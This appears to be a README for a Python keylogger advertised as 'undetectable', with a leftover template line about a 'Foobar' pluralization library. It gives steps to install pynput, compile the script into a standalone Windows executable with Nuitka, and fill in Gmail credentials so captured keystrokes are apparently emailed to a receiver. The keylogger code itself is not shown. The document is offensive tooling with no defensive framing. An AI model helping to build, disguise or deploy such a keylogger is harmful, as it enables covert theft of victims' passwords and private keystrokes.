# Python based Undetectable KeyLogger

Foobar is a Python library for dealing with word pluralization.

## Installation

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install foobar.

```bash
pip install pynput
```
You need to install [Nuitka](https://nuitka.net/releases/Nuitka-6.1.177.win-amd64.py39.msi) in order to transform the to a .exe file
 
***Important:***  Nuitka only works on Python 3.9
Then run  this command on CMD 
```bash
py -3.9 -m nuitka --mingw64 .\logger.py --standalone --onefile
```
## Usage

First, you need to set  the Gmail credentials of the sender and the mail of the receiver in this part of the code :
```python
gmail_user = ''
gmail_password = ''
gmail_receiver=''

```

Then run the logger.exe file. 

## License
[MIT](https://choosealicense.com/licenses/mit/)